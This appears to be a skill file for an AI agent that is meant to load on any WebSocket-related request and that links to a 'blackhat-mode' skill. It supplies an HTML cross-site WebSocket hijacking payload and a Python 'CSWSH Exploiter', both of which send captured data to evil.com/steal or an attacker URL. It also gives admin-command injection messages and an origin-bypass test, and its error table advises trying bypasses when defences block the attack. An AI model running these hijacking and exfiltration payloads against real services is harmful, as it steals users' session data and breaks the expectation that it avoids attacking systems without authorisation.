---
name: websocket-tools
description: "WebSocket attacks — hijacking, injection, cross-site WebSocket hijacking."
version: 1.0.0
author: Yatim
metadata:
  hermes:
    tags: [websocket, ws, wss, hijack, injection]
    related_skills: [blackhat-mode, exploit-tools]
prerequisites:
  commands: [python]
---

# WebSocket Attack Tools

## When to Load This Skill

User requests:
- "WebSocket", "WS", "WSS", "hijack", "injection"

---

## Recon

```bash
# Detect WebSocket
curl -s URL | grep -i "websocket\|ws://\|wss://"

# Check upgrade
curl -sI -H "Upgrade: websocket" -H "Connection: Upgrade" URL

# WebSocket endpoint
curl -s -H "Upgrade: websocket" -H "Connection: Upgrade" URL/ws
```

## Attacks

### Cross-Site WebSocket Hijacking (CSWSH)

```html
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  ws.send('{"action":"getUser","id":"123"}');
};
ws.onmessage = function(event) {
  fetch('https://evil.com/steal', {method:'POST', body: event.data});
};
</script>
```

### Message Injection

```json
{"action":"admin","command":"deleteUser","id":"123"}
{"action":"admin","role":"admin"}
```

### Origin Bypass

```bash
# Test origin validation
curl -sI -H "Origin: https://evil.com" -H "Upgrade: websocket" URL/ws
```

---

## Python WebSocket Tools

### WebSocket Tester

```python
import websocket
import json

def test_websocket(url, messages):
    ws = websocket.create_connection(url)
    results = []
    
    for msg in messages:
        ws.send(json.dumps(msg))
        result = ws.recv()
        results.append({
            'sent': msg,
            'received': json.loads(result)
        })
    
    ws.close()
    return results
```

### CSWSH Exploiter

```python
import websocket

def exploit_cswsh(ws_url, evil_url):
    ws = websocket.create_connection(ws_url)
    
    # Receive data
    data = ws.recv()
    
    # Send to attacker
    import requests
    requests.post(f'{evil_url}/steal', data={'data': data})
    
    ws.close()
```

---

## Output Format

```json
{
  "url": "wss://target.com/ws",
  "vulnerabilities": [
    {"type": "CSWSH", "origin_validation": false},
    {"type": "injection", "payload": "admin command"}
  ]
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Connection failed | Wrong URL | Check endpoint |
| Origin rejected | Origin validation | Try bypass |
| Message denied | Input validation | Try different payload |
